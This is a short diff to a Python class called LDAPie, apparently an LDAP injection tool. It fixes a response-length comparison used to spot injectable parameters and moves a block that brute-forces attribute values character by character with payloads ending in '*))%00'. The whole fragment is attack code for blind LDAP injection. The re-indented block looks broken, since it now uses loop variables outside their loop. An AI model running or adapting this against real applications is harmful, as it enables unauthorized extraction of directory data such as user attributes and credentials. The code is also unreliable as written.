@@ -60,7 +60,7 @@ class LDAPie:
                 time.sleep(5)
                 l = r.text
                 print('\033[1;31m'+url)
-                if len(l) != [cl1]:
+                if len(l) != cl1:
                    inj.append(str(x))
             return inj
 
@@ -72,9 +72,9 @@ class LDAPie:
             for x in char:
                 bf = requests.get(url+inj+val+x+"*))%00")
                 print(bf)
-        if user in r.content:
-            val += x
-            print("The Value For "+inj+" is "+val)
+    if user in r.content:
+        val += x
+        print("The Value For "+inj+" is "+val)
 #        break
 
 #main
